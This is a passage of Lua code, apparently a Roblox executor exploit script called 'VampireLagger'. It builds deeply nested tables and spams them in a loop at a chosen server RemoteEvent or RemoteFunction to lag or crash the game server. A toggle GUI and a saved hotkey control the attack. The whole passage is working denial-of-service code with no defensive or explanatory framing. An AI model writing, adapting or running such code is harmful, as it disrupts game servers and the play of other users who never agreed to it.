local savePath = "VampireLagger_Keybind.txt"
local function loadKeybind()
    local success, data = pcall(readfile, savePath)
    if success and data and data ~= "" then
        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
            if code.Name == data then
                hotkey = code
                keybindButton.Text = code.Name:sub(1,1)
                break
            end
        end
    end
end

local function saveKeybind(key)
    hotkey = key
    keybindButton.Text = key.Name:sub(1,1)
    pcall(writefile, savePath, key.Name)
end
loadKeybind()

local function resolvePath(path)
    if not path or path == "" then return nil end
    local current = game
    local cleanPath = path:gsub("^game%.", "")
    for segment in cleanPath:gmatch("[^%.]+") do
        if current then current = current[segment] else return nil end
    end
    return current
end

local function executeSpam(depth, iterations)
    local mainTable = {}
    local nested = {}
    table.insert(nested, {})
    local pointer = nested[1]
    for _ = 1, depth do
        local newTable = {}
        table.insert(pointer, newTable)
        pointer = newTable
    end
    for _ = 1, 2250 do
        table.insert(mainTable, nested)
    end
    local remote = resolvePath(remotePath)
    if remote then
        for _ = 1, iterations do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(mainTable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(mainTable)
                end
            end)
        end
    end
end

local function runLoop()
    while isActive do
        task.spawn(function() executeSpam(config.nestingDepth, config.spamCount) end)
        task.wait(config.cooldown)
    end
end

local function setEnabled(state)
    isActive = state
    if isActive then
        toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        toggleStroke.Color = Color3.fromRGB(0, 0, 0)
        statusText.Text = "ON"
        statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
        task.spawn(runLoop)
    else
        toggleButton.BackgroundColor3 = Color3.fromRGB(225, 0, 125)
        toggleStroke.Color = Color3.fromRGB(0, 0, 0)
        statusText.Text = "OFF"
        statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end

toggleButton.MouseButton1Click:Connect(function()
    setEnabled(not isActive)
end)

local isBinding = false
keybindButton.MouseButton1Click:Connect(function()
    isBinding = true
    keybindButton.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end
    if isBinding and input.UserInputType == Enum.UserInputType.Keyboard then
        saveKeybind(input.KeyCode)
        isBinding = false
    elseif hotkey and input.KeyCode == hotkey then
        setEnabled(not isActive)
    end
end)
